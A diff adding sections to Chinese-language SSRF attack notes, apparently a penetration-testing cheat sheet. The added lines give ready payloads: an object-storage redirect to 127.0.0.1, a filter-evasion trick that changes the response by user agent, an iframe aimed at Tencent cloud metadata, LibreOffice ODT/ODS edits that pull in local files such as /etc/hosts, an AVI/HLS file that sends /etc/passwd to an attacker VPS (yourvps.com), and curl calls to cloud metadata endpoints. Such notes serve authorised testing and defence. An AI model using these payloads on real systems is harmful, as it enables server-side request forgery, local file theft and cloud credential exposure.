@@ -106,6 +106,18 @@ DNS重绑定绕过
 + ``https://ssrf.xx.com/?.svg``
 + ``https://ssrf.xx.com/#.svg``
 
+利用对象存储回源绕过ssrf限制
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 创建一个存储桶
++ 开通公有读权限
++ 设置静态页面
++ 创建回源规则，回源类型重定向，回源条件，HTTP状态码404，回源地址：127.0.0.1，重定向code 301
+
+特殊绕过
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 原理： url会被多次请求，如一次java请求 + 一次python请求，java请求会对url进行检测（检测返回内容是否违规），python请求不会对url进行过滤。
++ vps上根据ua在第一次返回直接返回 ``Content-Type: image/svg+xml`` (根据实际情况而定，返回真实图片内容)，第二次请求返回 ``Content-Type: text/html`` ，从而绕过检测。
+
 特殊场景
 ----------------------------------------
 
@@ -122,7 +134,7 @@ DNS重绑定绕过
 			<image xlink:href="https://xxx.ssrf.com/1.png" height="200" width="200"/>
 			</svg>
 
-HTML导出PDF功能的SSRF
+HTML（html内容可控）导出PDF功能的SSRF
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ::
 
@@ -189,14 +201,49 @@ HTML导出PDF功能的SSRF
 	if __name__=='__main__':
 		main(*sys.argv[1:])
 
+HTML（标题可控）导出PDF功能的SSRF
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- payload： ``name="><iframesrc="http://metadata.tencentyun.com/latest/meta-data"></iframe>``
+
 基于开源libreoffice的HTML转PDF功能
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 + 攻击者可以构造一个HTML文件，包含一些特殊标签，如img、iframe、link等，在生成PDF文件时会将这些标签解析并发起相应的请求或者读取本地文件内容，攻击者可以通过解析生成的PDF文件来获取这些内容。
-+ excel文件转换pdf
++ csv注入：excel文件转换pdf
 	- 创建一个.ods文件
 	- 插入ole对象或者公式如 ``=INFO("osversion")``
 	- 文件重命名为.xlsx
 	- 上传文件之后观察pdf文件是否包含了相关内容
++ 文件读取/SSRF：word文件转换pdf
+	- 创建一个.odt文件
+	- 插入ole对象:  ``从文件创建-》链接到文件`` ，输入本机存在的文件，如 ``file:///C:/Windows/win.ini``
+	- ``unzip test.odt -d test``
+	- 编辑 ``test/content.xml`` ，修改 ``<draw:object xlink:href="../../../../../../../../../../../etc/hosts" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>``
+	- ``cd test`` , ``zip -r ../test.odt *``
+	- 上传文件之后观察pdf文件是否包含了相关内容
+
+avi视频编辑场景
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ SSRF
+	- 首先在vps(攻击者控制的服务器)上面运行： ``python3 file_reading_server.py --external--addr <externa-ip-of-your-server> --port8080``
+	- 修改AVI文件，使用16进制编辑器将嵌入的HTTP链接修改为： ``http://<external-ip-of-your-server>:8080/initial.m3u?filename=/etc/passwd``
+	- 目标往上上传avi文件，avi文件会被解析，avi文件中嵌入的HTTP链接会被访问，从而读取本地文件内容。
++ 任意文件读取
+	::
+
+		test.avi文件内容：
+		#EXTM3U
+		#EXT-X-MEDIA-SEQUENCE:0
+		#EXTINF:10.0,
+		concat:http://yourvps.com/header.m3u8|file:///etc/passwd
+		#EXT-X-ENDLIST
+
+		header.m3u8文件内容（放置在攻击者服务器http://yourvps.com上，文件末尾不能使空格）：
+		#EXTM3U
+		#EXT-X-MEDIA-SEQUENCE:0
+		#EXTINF:,
+		http://yourvps.com?
+
+		vps收到： 54.82.61.224 -- [11/Feb/2016:04:55:32-0500] "GET ?root:x:0:0:root:/root:/bin/bash HTTP /1.1" 400 173
 
 云服务器
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -226,6 +273,40 @@ HTML导出PDF功能的SSRF
 	"></img>
 	</body>
 
+
+各种云元数据地址
+---------------------------------------
+::
+
+	阿里云：
+	http://100.100.100.200/latest/meta-data/
+	http://100.100.100.200/latest/meta-data/
+	http://100.100.100.200/latest/meta-data/instance-id
+
+	腾讯云：
+	http://metadata.tencentyun.com/latest/meta-data/
+	http://metadata.tencentyun.com/latest/meta-data/
+	http://metadata.tencentyun.com/latest/meta-data/instance-id
+	http://metadata.tencentyun.com/latest/meta-data/placement/region
+
+	华为云：
+	http://169.254.169.254/latest/meta-data/
+	http://169.254.169.254/latest/meta-data/instance-type
+	http://169.254.169.254/latest/meta-data/local-ipv4
+	http://169.254.169.254/latest/meta-data/placement/availability-zone
+
+	AWS：
+	http://169.254.169.254/latest/meta-data/
+
+	Azure：
+	http://169.254.169.254/metadata/instance
+	示例：curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2025-04-07"
+	注意：必须添加请求头 Metadata: true。
+
+	GCP (Google Cloud)
+	访问地址：http://metadata.google.internal/
+	示例：curl "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"
+	注意：必须添加请求头 Metadata-Flavor: Google。
 
 挖掘思路
 ---------------------------------------
